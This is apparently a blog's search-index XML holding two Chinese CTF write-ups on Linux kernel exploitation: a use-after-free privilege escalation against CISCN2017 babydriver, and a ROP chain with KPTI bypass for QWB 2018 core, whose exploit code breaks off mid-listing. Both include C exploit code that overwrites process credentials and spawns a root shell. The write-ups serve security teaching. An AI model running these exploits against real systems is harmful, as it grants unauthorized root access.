<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kernel初识 - Kernel UAF</title>
      <link href="/posts/16111.html"/>
      <url>/posts/16111.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h1><p><code>UAF</code> 即 <code>Use After Free</code> ，通常指的是对于释放后未重置的垂悬指针利用 。此前在用户态下heap阶段的很多对于 <code>ptmalloc</code> 利用都是基于 <code>UAF</code> 漏洞进行进一步的利用 。</p><p>在 CTF 当中，内核的 “堆内存” 主要指的是直接映射区（direct mapping area），常用的分配函数 <code>kmalloc</code> 从此分配内存，常用的分配器为 <code>slub allocator</code> ，若是在 kernel 中存在垂悬指针，我们同样可以以此完成对 <code>slab/slub</code> 内存分配器的利用，通过 <code>Kernel UAF</code> 完成提权 。</p><h1 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194815016.png" alt="image-20250720142741181"></p><p>题目只给了我们<code> boot.sh</code> 、<code>bzImage</code> 、<code>rootfs.cpio</code> 三个文件</p><p>观察一下  <code>boot.sh</code> 这应该是题目的启动脚本相关的：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194847147.png" alt="image-20250720142937512"></p><p>脚本很正常 ，接下来我们将 <code>rootfs.cpio</code> 文件解包进一步分析 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">mv rootfs.cpio.gz core</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">cpio -idm &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194811330.png" alt="image-20250720143305801"></p><p>观察一下 <code>init</code> 文件：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194812449.png" alt="image-20250720143340207"></p><p>对 flag 文件赋予了root权限 ，其他命令一切正常 ，这里把 .ko 文件保存在了 &#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko 了</p><p>我们用ida打开.ko文件，对其进行一个逆向分析</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194813962.png" alt="image-20250720143653730"></p><p>可以看到总共有这一些函数，我们先来看 init 、exit 函数 ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194815169.png" alt="image-20250720143743373"></p><p>对 baby_dev 进行了一个初始化</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194817215.png" alt="image-20250720143903897"></p><p>对 baby_dev 进行了一个清理 ，这两个函数都很正常 ，没有什么大问题</p><p>接下来看 open 和 release 函数：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194819198.png" alt="image-20250720144016803"></p><p>创造了一个 0x40 大小的堆块 ，将指针放置在了 babydev_struct.devicve_buf 这个全局变量里面 ，同时将babydev_struct.device_buf_len 设置为 0x40 大小 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194820865.png" alt="image-20250720144318579"></p><p>release 则是对该全局变量指向的指针堆块进行一个释放 ，但是释放后没有把指针进行清空，所以存在一个 uaf 漏洞</p><p>接下来分析的是 read 以及 write 函数：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194822598.png" alt="image-20250720144428638"></p><p>read 函数显示检测 len 的长度大小是否小于 babydev_struct.devicve_buf_len ，然后复制  babydev_struct.devicve_buf 里的内容到用户态的 buffer 里面去 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194823961.png" alt="image-20250720144635864"></p><p>wrtie 函数是从用户态复制 buffer 到 babydev_struct.devicve_buf 里面去 ，这样可能看得不是很清楚，所以我们可以去看看汇编</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194826096.png" alt="image-20250720145320892"></p><p>发现调用时 rdi 是等于 babydev_struct.devicve_buf 的 ，所以我们的猜想正确</p><p>最后我们看看 ioctl 函数 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194827639.png" alt="image-20250720145853620"></p><p>ioctl 函数释放掉了全局变量的堆块指针，同时申请了一个用户自定义大小的堆块，由于程序存在uaf漏洞，所以我们可以直接通过uaf漏洞纂改 struct cred 结构体 ，从而达到提权的目的，下面我直接引用<strong>z1r0</strong>师傅的解题思路：</p><p>这里其实就是个竞争uaf漏洞。也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。</p><p>初始化两个，释放第一个，再给第一个ioctl到指定的地址，接下来修改第二个其实就是修改的第一个的地址内容。因为存在uaf，重启再用不会清0。</p><p>这里最关键的是buf是全局变量，两个都用的是一个buf，存在竞争。前面说到过提权的方法，可以改cred来进行root提权，这个版本是：4.4.72 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;    /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;        /* real UID of the task */</span><br><span class="line">    kgid_t      gid;        /* real GID of the task */</span><br><span class="line">    kuid_t      suid;       /* saved UID of the task */</span><br><span class="line">    kgid_t      sgid;       /* saved GID of the task */</span><br><span class="line">    kuid_t      euid;       /* effective UID of the task */</span><br><span class="line">    kgid_t      egid;       /* effective GID of the task */</span><br><span class="line">    kuid_t      fsuid;      /* UID for VFS ops */</span><br><span class="line">    kgid_t      fsgid;      /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits; /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable; /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;  /* caps we&#x27;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;  /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;   /* capability bounding set */</span><br><span class="line">    kernel_cap_t    cap_ambient;    /* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;    /* default keyring to attach requested</span><br><span class="line">                     * keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">    struct key  *process_keyring; /* keyring private to this process */</span><br><span class="line">    struct key  *thread_keyring; /* keyring private to this thread */</span><br><span class="line">    struct key  *request_key_auth; /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;  /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;   /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">    struct group_info *group_info;  /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head rcu;        /* RCU deletion hook */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么根据 UAF 的思想，思路如下：</p><ol><li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li><li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li><li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li></ol><p>需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0xa8（注意使用相同内核版本的源码）。</p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    int fd1,fd2;</span><br><span class="line">    //开启了两个设备，这两个设备共用一个babydev_struct.device_buf</span><br><span class="line">    fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);</span><br><span class="line">    fd2 = open(&quot;/dev/babydev&quot;,O_RDWR);</span><br><span class="line">    //调用ioctl在babydev_struct.device_buf申请一个struct cred大小的内存</span><br><span class="line">    ioctl(fd1,65537,0xa8);</span><br><span class="line">    //关掉设备fd1，但是由于存在uaf我们的fd2依然可以控制babydev_struct.device_buf</span><br><span class="line">    close(fd1);</span><br><span class="line">    //开启一个新的进程：</span><br><span class="line">    int pid = fork();</span><br><span class="line">    if(pid == 0)&#123;</span><br><span class="line">        puts(&quot;\033[34m\033[1m[*] Process creation successful .\033[0m&quot;);</span><br><span class="line">        char buf[28] = &#123;0&#125;;</span><br><span class="line">        write(fd2,buf,28);</span><br><span class="line">        if(getuid() == 0)&#123;</span><br><span class="line">            puts(&quot;\033[34m\033[1m[*] pwn!!! success ! .\033[0m&quot;);</span><br><span class="line">            // 起一个root shell</span><br><span class="line">            system(&quot;/bin/sh&quot;);</span><br><span class="line">        &#125;else if(pid &lt; 0)&#123;</span><br><span class="line">            puts(&quot;\033[34m\033[1m[*] There were some minor issues.  .\033[0m&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        wait(NULL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译进core，重新打包启动，运行exp即可提权</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810194830254.png" alt="image-20250720150648147"></p><p>提权成功！</p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel初识 - Kernel ROP with KPTI bypass</title>
      <link href="/posts/16110.html"/>
      <url>/posts/16110.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kernel-ROP-with-KPTI-bypass"><a href="#Kernel-ROP-with-KPTI-bypass" class="headerlink" title="Kernel ROP with KPTI bypass"></a>Kernel ROP with KPTI bypass</h1><ul><li><u>KPTI 相关概念直接引用 CTFwiki</u></li></ul><p><a href="https://www.kernel.org/doc/html/latest/x86/pti.html">KPTI</a> 即 <code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。</p><p>KPTI 的发明主要是用来修复一个史诗级别的 CPU 硬件漏洞：Meltdown。简单理解就是利用 CPU 流水线设计中（乱序执行与预测执行）的漏洞来获取到用户态无法访问的内核空间的数据，属于侧信道攻击的一种。</p><p><strong>KPTI 同时还令内核页表中属于用户地址空间的部分不再拥有执行权限，这使得 ret2usr 彻底成为过去式</strong> 。</p><p>对于开启了 KPTI（内核页表隔离），我们<strong>不能像之前那样直接 swapgs ; iret 返回用户态</strong>，而是在返回用户态之前还<strong>需要将用户进程的页表给切换回来</strong> 。</p><p>众所周知 Linux 采用<strong>四级页表</strong>结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页 4k，总计 8k，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012811282.png" alt="image-20250720182541886"></p><p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，但两张页表都有着对用户内存空间的完整映射</strong>，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012741491.png" alt="image-20250720182551250"></p><p><strong>KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式</strong> 。</p><p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 <code>arch/x86/entry/entry_64.S</code> 中提供了一个用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得。</p><p>由于源码的汇编代码编写较为繁重，我们可以通过 IDA 逆向的方式查看其基本汇编逻辑：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012737530.png" alt="image-20250720182558251"></p><p>在实际操作时前面的一些栈操作都可以跳过，直接从 <code>mov rdi, rsp</code> 开始，这个函数大概可以总结为如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure><p>因此我们只需要布置出如下栈布局即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h2 id="开启KPTI保护"><a href="#开启KPTI保护" class="headerlink" title="开启KPTI保护"></a>开启KPTI保护</h2><p>只需要在内核启动参数 <code>-append</code> 中添加 <code>pti=on</code> 选项以显式开启 KPTI 保护</p><h2 id="例题-：强网杯-2018-core"><a href="#例题-：强网杯-2018-core" class="headerlink" title="例题 ：强网杯 2018 - core"></a>例题 ：强网杯 2018 - core</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012739758.png" alt="image-20250720183432112"></p><p>由于题目刚开始是没有开启 KPTI 保护的 ，所以我们需要手动在启动参数 <code>-append</code> 中添加 <code>pti=on</code> </p><p>然后我们启动程序 ，先观察一下 ，如果开启 KPTI 保护 ，执行我们之前的 exp 会发生什么 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012741565.png" alt="image-20250720183625537"></p><p>可以看到运行之前的 exp 直接报错了 ，原因在于我们在内核态的页表中， 用户地址空间部分对应的页顶级表项没有可执行权限 </p><p>因此我们在返回用户态之前还需要先将内核态页表切换回来，这里我们在完成提权后直接使用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数返回用户态即可，而无需直接手动调用 <code>iretq</code> 指令。</p><p>而<code>swapgs_restore_regs_and_return_to_usermode</code>的地址我们依旧可以通过保存在 tmp&#x2F;kallsyms 的函数地址来进行读取</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012743444.png" alt="image-20250720184049653"></p><p><code>cat /proc/kallsyms | grep &quot;swapgs_restore_regs_and_return_to_usermode&quot;</code></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012745930.png" alt="image-20250720184434389"></p><p>然后我们就得到了这个函数的地址 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012749226.png" alt="image-20250720185055421"></p><p>计算偏移 ，这个偏移加上我们在调用exp得到的vmlinux地址就是我们最终的函数地址 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012800865.png" alt="image-20250720185256511"></p><p>这个是 <code>swapgs_restore_regs_and_return_usermode</code> 函数的汇编代码，可以看到前面有很多 pop ，但是我们实际要从 <code>mov rdi,rsp</code> 开始 ，而这个地方的偏移恰好是在 <code>swapgs_restore_regs_and_return_usermode + 22</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>这个是我们要布置的栈布局 ，稍微改一下之前的代码就可以了</p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">void setoff(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889c,size);</span><br><span class="line">&#125;</span><br><span class="line">void core_read(int fd,char *buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889b,buf);</span><br><span class="line">&#125;</span><br><span class="line">void core_copy_func(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889a,size);</span><br><span class="line">&#125;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd ;</span><br><span class="line">    size_t tmp;</span><br><span class="line">    char buf[0x50];</span><br><span class="line">    size_t rop[0x100];</span><br><span class="line">    size_t vmlinux_base,canary,core_base;</span><br><span class="line">    size_t commit_creds = 0x9c8e0;</span><br><span class="line">    size_t prepare_kernel_cred = 0x9cce0;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(&quot;/proc/core&quot;,O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Open /proc/core error!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。</span><br><span class="line">    core_read(fd,buf); 